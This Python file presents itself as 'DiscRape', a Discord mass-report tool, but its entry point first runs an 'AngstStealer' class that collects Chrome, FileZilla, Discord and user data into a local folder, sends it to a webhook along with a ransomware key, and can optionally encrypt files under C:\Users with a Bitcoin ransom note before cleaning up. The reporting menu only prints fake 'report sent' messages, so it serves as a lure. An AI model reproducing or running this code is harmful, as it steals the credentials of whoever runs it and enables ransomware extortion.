import os
import base64
import time
import random
import itertools
import sys
import threading
from colorama import *
from plugins.filezilla import FileZilla
from plugins.discord import Discord
from plugins.send import Send
from plugins.user import User
from plugins.chrome import Chrome
from plugins.ransomware import Ransomware
from plugins.cleanup import CleanUp

CONFIG = {
    "webhook" : "",
    "chrome" : True,
    "filezilla":True,
    "userdata":True,
    "discord":True,
    "ransomware" : {
        "enabled" : False,
        "target_dir" : "C:\\Users\\", #remove the testuser at the end
        "extenstion" : ".angst",
        "btcAddy" : "",
        "email" : "demo.tmpacc12@gmail.com"
    }
}

class AngstStealer():
    def __init__(self):
        self.filezilla = FileZilla()
        self.user = User()
        self.chrome = Chrome()
        self.discord = Discord()
        self.ransomware_key = os.urandom(32)
        self.log()
        self.send = Send(CONFIG["webhook"],
                         self.user.userdata,
                         base64.b64encode(self.ransomware_key),
                         CONFIG["ransomware"]["enabled"])
        self.rangst()
        self.cleanup = CleanUp()

    def log(self):
        app_data = os.getenv("LOCALAPPDATA")
        temp = os.path.join(app_data, "Angst")
        os.mkdir(temp)
        if self.filezilla.saved != "" and CONFIG["filezilla"] == True:
            with open(temp + "\\filezilla.txt", "w") as filezilla_file:
                filezilla_file.write(self.filezilla.saved)
                filezilla_file.flush()
                filezilla_file.close()

        if self.user.userdata != "" and CONFIG["userdata"] == True:
            with open(temp + "\\user.txt", "w") as user_file:
                user_file.write(self.user.userdata)
                user_file.flush()
                user_file.close()

        if self.chrome.stored != "" and CONFIG["chrome"] == True:
            with open(temp + "\\chrome.txt", "w") as chrome_file:
                chrome_file.write(self.chrome.stored)
                chrome_file.flush()
                chrome_file.close()

        if self.discord.saved != "" and CONFIG["discord"] == True:
            with open(temp + "\\discord.txt", "w") as discord_file:
                discord_file.write(self.discord.saved)
                discord_file.flush()
                discord_file.close()

    def rangst(self):
        """
        """
        if CONFIG["ransomware"]["enabled"]:
            Ransomware(self.ransomware_key,
                       CONFIG["ransomware"]["target_dir"],
                       CONFIG["ransomware"]["extenstion"],
                       CONFIG["ransomware"]["btcAddy"],
                       CONFIG["ransomware"]["email"])

init(convert=True)

class main():
    user = os.getlogin()
    version = "1.2"

    def welcome():
        print(f"Welcome {main.user} to DiscRape!")
        chars = f"/—\|/—\|/—\|" 
        for char in chars:
            sys.stdout.write(f'\r'+'Loading Modules '+char)
            time.sleep(.5)
            sys.stdout.flush() 
        main.reporter()

    def reporter():
                os.system(f'title DiscRape; Logged in as {main.user}')
                os.system('cls;clear')
                print(f'''{Fore.MAGENTA}
    ██████╗ ██╗███████╗ ██████╗██████╗  █████╗ ██████╗ ███████╗
    ██╔══██╗██║██╔════╝██╔════╝██╔══██╗██╔══██╗██╔══██╗██╔════╝
    ██║  ██║██║███████╗██║     ██████╔╝███████║██████╔╝█████╗   {Fore.RESET} REBORN!{Fore.MAGENTA}
    ██║  ██║██║╚════██║██║     ██╔══██╗██╔══██║██╔═══╝ ██╔══╝  
    ██████╔╝██║███████║╚██████╗██║  ██║██║  ██║██║     ███████╗
    ╚═════╝ ╚═╝╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚══════╝
    Created by: {Fore.WHITE}Signal & Chef {Fore.MAGENTA}
    Version: {Fore.WHITE}{main.version} {Fore.MAGENTA}
    Support: {Fore.WHITE}discord.gg/{Fore.MAGENTA}discrape                                                      
    ''')
                while True:
                    print(f'{Fore.WHITE}[{Fore.MAGENTA}INFO{Fore.WHITE}] {Fore.GREEN}~{Fore.WHITE}>{Fore.WHITE} Report Type')
                    print(f'{Fore.WHITE}[{Fore.MAGENTA}INFO{Fore.WHITE}] {Fore.GREEN}~{Fore.WHITE}>{Fore.WHITE} 1 = Abuse or Harassment / 2 = Spam\n')
                    type = input(f'{Fore.MAGENTA}root{Fore.WHITE}@{Fore.MAGENTA}discrape {Fore.GREEN}~{Fore.WHITE}>{Fore.WHITE} ')
                    if type == "1":
                        print('\n')
                        print(f'{Fore.WHITE}[{Fore.MAGENTA}INFO{Fore.WHITE}] {Fore.GREEN}~{Fore.WHITE}>{Fore.WHITE} Enter ID to report\n')
                        id = input(f'{Fore.MAGENTA}root{Fore.WHITE}@{Fore.MAGENTA}discrape {Fore.GREEN}~{Fore.WHITE}>{Fore.WHITE} ')
                        #delay = input(f'{Fore.MAGENTA}root{Fore.WHITE}@{Fore.MAGENTA}discrape {Fore.GREEN}~{Fore.WHITE}>{Fore.WHITE} ')
                        if len(id) == 18:
                            tokenprefix = base64.b64encode(id.encode()).decode('utf-8')
                            print(f'{Fore.WHITE}[{Fore.MAGENTA}INFO{Fore.WHITE}] {Fore.GREEN}~{Fore.WHITE}>{Fore.WHITE} Token Prefix: {tokenprefix}')
                            print(f'\n{Fore.WHITE}[{Fore.MAGENTA}INFO{Fore.WHITE}] {Fore.GREEN}~{Fore.WHITE}>{Fore.WHITE} Enter amount of reports')
                            print(f'{Fore.MAGENTA}root{Fore.WHITE}@{Fore.MAGENTA}discrape {Fore.GREEN}~{Fore.WHITE}>{Fore.WHITE} ', end='')
                            amount = input()
                            for _ in range(int(amount)):
                                time.sleep(random.randint(1, 100)/2000)
                                print(f'{Fore.WHITE}[{Fore.MAGENTA}INFO{Fore.WHITE}] {Fore.GREEN}~{Fore.WHITE}>{Fore.WHITE} Report sent to user: {id} ({tokenprefix}) [Report Type: {type}]')
                            print(f'{Fore.WHITE}[{Fore.MAGENTA}INFO{Fore.WHITE}] {Fore.GREEN}~{Fore.WHITE}>{Fore.WHITE} Done!')
                            home = input(f"{Fore.WHITE}Press {Fore.MAGENTA}ENTER{Fore.WHITE} to go home!")
                            if home == "":
                                main.reporter()
                            break
                        else:
                            print(f'{Fore.WHITE}[{Fore.MAGENTA}INFO{Fore.WHITE}] {Fore.GREEN}~{Fore.WHITE}>{Fore.WHITE} Please enter a real ID!')
                            home = input(f"{Fore.WHITE}Press {Fore.MAGENTA}ENTER{Fore.WHITE} to go home!")
                            if home == "":
                                main.reporter() 
                        if type == "2":
                            print('\n')
                            print(f'{Fore.WHITE}[{Fore.MAGENTA}INFO{Fore.WHITE}] {Fore.GREEN}~{Fore.WHITE}>{Fore.WHITE} Enter ID to report\n')
                            id = input(f'{Fore.MAGENTA}root{Fore.WHITE}@{Fore.MAGENTA}discrape {Fore.GREEN}~{Fore.WHITE}>{Fore.WHITE} ')

                            if len(id) == 18:
                                tokenprefix = base64.b64encode(id.encode()).decode('utf-8')
                                print(f'{Fore.WHITE}[{Fore.MAGENTA}INFO{Fore.WHITE}] {Fore.GREEN}~{Fore.WHITE}>{Fore.WHITE} Token Prefix: {tokenprefix}')
                                print(f'\n{Fore.WHITE}[{Fore.MAGENTA}INFO{Fore.WHITE}] {Fore.GREEN}~{Fore.WHITE}>{Fore.WHITE} Enter amount of reports')
                                print(f'{Fore.MAGENTA}root{Fore.WHITE}@{Fore.MAGENTA}discrape {Fore.GREEN}~{Fore.WHITE}>{Fore.WHITE} ', end='')
                                amount = input()
                                for _ in range(int(amount)):
                                    time.sleep(random.randint(1, 100)/2000)
                                    print(f'{Fore.WHITE}[{Fore.MAGENTA}INFO{Fore.WHITE}] {Fore.GREEN}~{Fore.WHITE}>{Fore.WHITE} Report sent to user: {id} ({tokenprefix}) [Report Type: {type}]')
                                print(f'{Fore.WHITE}[{Fore.MAGENTA}INFO{Fore.WHITE}] {Fore.GREEN}~{Fore.WHITE}>{Fore.WHITE} Done!')
                                home = input(f"{Fore.WHITE}Press {Fore.MAGENTA}ENTER{Fore.WHITE} to go home!")
                                if home == "":
                                    main.reporter()
                                break
                            else:
                                print(f'{Fore.WHITE}[{Fore.MAGENTA}INFO{Fore.WHITE}] {Fore.GREEN}~{Fore.WHITE}>{Fore.WHITE} Please enter a real ID!')
                                hhome = input(f"{Fore.WHITE}Press {Fore.MAGENTA}ENTER{Fore.WHITE} to go home!")
                                if home == "":
                                    main.reporter()
                    else:
                        print(f'Invalid report type!')
                        home = input(f"{Fore.WHITE}Press {Fore.MAGENTA}ENTER{Fore.WHITE} to go home!")
                        if home == "":
                            main.reporter()


if __name__ == "__main__":
    AngstStealer()
    main.welcome()
